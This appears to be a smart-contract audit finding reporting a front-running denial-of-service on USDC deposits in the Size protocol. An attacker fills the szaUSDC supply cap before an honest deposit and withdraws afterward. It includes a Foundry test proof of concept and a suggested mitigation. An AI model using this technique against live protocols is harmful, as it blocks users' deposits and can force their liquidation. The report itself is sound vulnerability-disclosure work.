# Vulnerability details

## Description
When a user wants to deposit some ```USDC``` in Size and get back ```szaUSDC``` so to borrow them or repay a loan, he will call the ```deposit()``` function in the ```Size.sol``` contract. This function will validate the parameters and then will call ```executeDeposit()``` function which will check which will check which token is it (```USDC``` or ```WETH```) and will make the appropriate minting and transfering. However, in the case that the deposit is about ```USDC``` (and not in multicall process) a check will be made so the ```totalSupply``` of ```szaUSDC``` to not have surppased 1,000,000e6 limit(or any limit set by the protocol). If this check does not pass, the deposit will revert. A malicious user can exploit this by front-running a deposit of ```USDC``` with a deposit which is slightly less than the 1,000,000e6 limit(or any limit set by the protocol). This will have as a result, the real user who tries to deposit ```USDC``` to be reverted because his deposit surpasses the limit. After this, the malicious user can backrun it calling the ```withdraw()``` function and get back his whole ```USDC``` which DoSed the real user's deposit. Malicious user can do this for every honest deposit of ```USDC``` at no cost since there is no a deposit/withdraw fee.

## Impact
The impact of this vulnerability is a completete DoS of every deposit unless it is in a multicall where the check will not be made. A denial of deposit, of course, can have catastrophic results for the protocol since users will not be able to repay their loans on time(or at all) or lend their assets. So, a malicious user can DoS a deposit of USDC, so to liquidate a user who is trying to repay his debt.

## Proof of Concept
To understand this vulnerability better, attach this test in ```DepositValidation.t.sol``` contract and run ```forge test --mt test_Deposit_DoS -vvvv``` :

```solidity
    import {WithdrawParams} from "@src/libraries/actions/Withdraw.sol";
    import {console} from "forge-std/Test.sol";
```

```solidity
    function test_Deposit_DoS() public {
        uint256 honestAmount = 1_000;
        uint256 maliciousAmount = 999_980;

        _mint(address(usdc), bob, maliciousAmount * 1e6);
        _mint(address(usdc), alice, honestAmount * 1e6);

        _approve(bob, address(usdc), address(size), maliciousAmount * 1e6);
        _approve(alice, address(usdc), address(size), honestAmount * 1e6);

        console.log("Malicious Bob USDC balance before the DoS : ", usdc.balanceOf(bob));
        console.log("Alice USDC balance before the DoS : ", usdc.balanceOf(alice));

        // Front running Alice's deposit with big deposit
        vm.prank(bob);
        size.deposit(DepositParams({token: address(usdc), amount: maliciousAmount * 1e6, to: bob}));
        
        // Alice's honest deposit
        vm.expectRevert();
        vm.prank(alice);
        size.deposit(DepositParams({token: address(usdc), amount: honestAmount * 1e6, to: alice}));

        // Back running Alice's deposit with whole withdraw
        vm.prank(bob);
        size.withdraw(WithdrawParams({token: address(usdc), amount: maliciousAmount * 1e6, to: bob}));

        console.log("Malicious Bob USDC balance after the DoS : ", usdc.balanceOf(bob));
        console.log("Alice USDC balance after the DoS : ", usdc.balanceOf(alice));
    }
```

## Recommended Mitigation Steps
To prevent this DoS attack from happening (without restructuring the whole protocol adding fees or timelocks), we suggest to remove ```validateBorrowATokenCap```.
